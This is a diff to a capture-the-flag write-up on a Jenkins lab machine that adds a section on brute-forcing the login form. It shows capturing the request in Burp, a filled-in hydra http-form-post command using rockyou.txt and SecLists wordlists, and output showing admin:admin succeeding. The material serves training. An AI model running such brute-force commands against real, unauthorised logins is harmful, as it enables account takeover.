@@ -126,10 +126,87 @@ We can go with the basic **admin:1234**, **admin:password**, **admin:admin**, et
 
 Look at that, using **admin:admin** to log in has granted us access to Jenkins.
 
-If a super weak password was not available, I'd probably try to force my way through this login form using **Burp's Intruder** or **hydra** with the **rockyou.txt** wordlist.
-
 ![Jenkins admin panel](https://i.imgur.com/kzHXdI4.png)
-So that gives us the answer to Question #2.
+
+**_But wait, what if we didn't managed to find that super insecure credential?_** Well, in that case we should try to demonstrate how to use a combination of Burp and Hydra to brute force the login form. Let's look into that now.
+
+To start let's launch **Burp Suite**, we'll be using the integrated browser to navigate the site and review the details of the login request it gets sent when we attempt to log into Jenkins.
+
+![Burp Suite](https://i.imgur.com/SBakfmQ.png)
+
+>_NOTE:_ If you get an eror about the integrated browser not able to run due to sandboxed settings. Got to Project Options -> Misc -> Check "allow the embedded browser to run without a sandbox".
+
+Once you have Burp running in the **Proxy -> Intercept** tab click on **Open Browser**. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.
+
+- Remember to add the target IP to Burp's Scope, so it doesn't stop every single request from non-targed related IPs.
+
+Ok so in order to brute force the login with Hydra, we need to Intercept a login request with Burp so we can get some important pieces of Information: **[URL]**, **[UsernameField]**, **[PasswordField]** and the **[InvalidCredentialsErrorMessage]**. These are all required for our Hydra attack.
+
+To get those, let's attempt to login with some invalid credentials just as **test:test**.
+
+![Jenkins Login error](https://i.imgur.com/AKP9Wop.png)
+
+Let's see the request in Burp:
+
+![Intercepted Login Request](https://i.imgur.com/KL3wpw9.png)
+As we can see in the intercepted request we get the rest of the pieces we were looking for. So now we have all of them ready for Hydra:
+
+- **[URL]**: /j_acegi_security_check
+- **[UsernameField]**: j_username
+- **[PasswordField]**: j_password
+- **[InvalidCredentialsErrorMessage]**: Invalid username or password
+
+We'll also need to know the **[PORT]** where the login forms lives, but we know that already from our namp scan(8080).
+
+So now let's try to configure **Hydra** so we can trigger that brute force attack.
+
+First let's review the required parameters we must specify and how our command its formated:
+
+```bash
+sudo hydra -s [PORT] [IP] http-form-post "/[URL]:[UsernameField]=^USER^&[PasswordField]=^PASS^:[InvalidCredentialsErrorMessage]" -L rockyou.txt -P rockyou.txt
+```
+
+So if we fill in the required data, and using rockyou.txt our command will look like this:
+
+```bash
+sudo hydra -s 8080 10.10.192.65 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -L rockyou.txt -P rockyou.txt
+```
+
+This might take a while to complete and we probably have to locate a better password/usernames wordlist, so it is worth mentioning **SecLists** as a great resource for those. Check [this link](https://github.com/danielmiessler/SecLists).
+
+After a while we should see something like this:
+
+```bash
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-17 14:10:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 205761065451876 login tries (l:14344374/p:14344374), ~12860066590743 tries per task
+[DATA] attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password
+[STATUS] 384.00 tries/min, 384 tries in 00:01h, 205761065451492 to do in 8930601799:07h, 16 active
+[STATUS] 384.00 tries/min, 1152 tries in 00:03h, 205761065450724 to do in 8930601799:05h, 16 active
+[STATUS] 381.71 tries/min, 2672 tries in 00:07h, 205761065449204 to do in 8984078456:30h, 16 active
+
+```
+
+As you can see this attack is gonna take a while since rockyou.txt is quite a large list. So let's use one of the SecList's shorter lists called [**best1050.txt**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt). 
+
+
+With the new list we get our result much faster:
+
+```bash
+sudo hydra -s 8080 10.10.192.65 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -L best1050.txt -P best1050.txt -w 30
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-17 14:32:55
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1102500 login tries (l:1050/p:1050), ~68907 tries per task
+[DATA] attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password
+[STATUS] 384.00 tries/min, 384 tries in 00:01h, 1102116 to do in 47:51h, 16 active
+[STATUS] 384.00 tries/min, 1152 tries in 00:03h, 1101348 to do in 47:49h, 16 active
+[8080][http-post-form] host: 10.10.192.65   login: admin   password: admin
+```
+
+
+So that gives us the answer to Question #2 in a brute forced way.
 
 Let's move to the next objective.
 
